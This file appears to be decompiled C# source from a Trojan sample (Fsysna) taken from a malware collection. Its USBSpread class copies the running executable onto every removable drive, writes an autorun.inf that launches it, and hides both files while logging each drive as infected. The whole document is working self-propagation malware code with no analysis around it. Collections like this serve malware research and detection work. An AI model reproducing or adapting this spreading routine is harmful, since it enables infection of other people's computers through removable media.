// Decompiled with JetBrains decompiler
// Type: Project_Unamed.USBSpread
// Assembly: Project Unnamed, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E14D2CAF-643A-42A5-AF85-1F02787E6112
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Fsysna.dkho-1e6991871b0b19bec231c68029dfc8a762f32ed88d5a1aa5b922eb829ff10319.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Project_Unamed.My;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;

namespace Project_Unamed
{
  public class USBSpread
  {
    [DebuggerNonUserCode]
    public USBSpread()
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static string Spread()
    {
      string fileName = Process.GetCurrentProcess().Modules[0].FileName;
      int count = MyProject.Computer.FileSystem.Drives.Count;
      string str = "USB SPREAD LOG\r\n";
      int num = checked (count - 1);
      int index = 0;
      while (index <= num)
      {
        try
        {
          if (MyProject.Computer.FileSystem.Drives[index].IsReady)
          {
            if (MyProject.Computer.FileSystem.Drives[index].DriveType == DriveType.Removable)
            {
              string fullName = MyProject.Computer.FileSystem.Drives[index].RootDirectory.FullName;
              string text = "[autorun]\r\nopen=" + new FileInfo(fileName).Name;
              string name = new FileInfo(fileName).Name;
              if (File.Exists(fullName + name))
                File.Delete(fullName + name);
              if (File.Exists(fullName + "autorun.inf"))
                File.Delete(fullName + "autorun.inf");
              MyProject.Computer.FileSystem.WriteAllText(fullName + "autorun.inf", text, false);
              MyProject.Computer.FileSystem.CopyFile(fileName, fullName + name);
              FileSystem.SetAttr(fullName + name, FileAttribute.Hidden);
              FileSystem.SetAttr(fullName + "autorun.inf", FileAttribute.Hidden);
              str = str + fullName + " Infected\r\n";
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Exception exception = ex;
          str = str + "Error @ Drive No " + Conversions.ToString(index) + "\r\n" + "Full error: " + exception.ToString() + "\r\n";
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      return str;
    }
  }
}
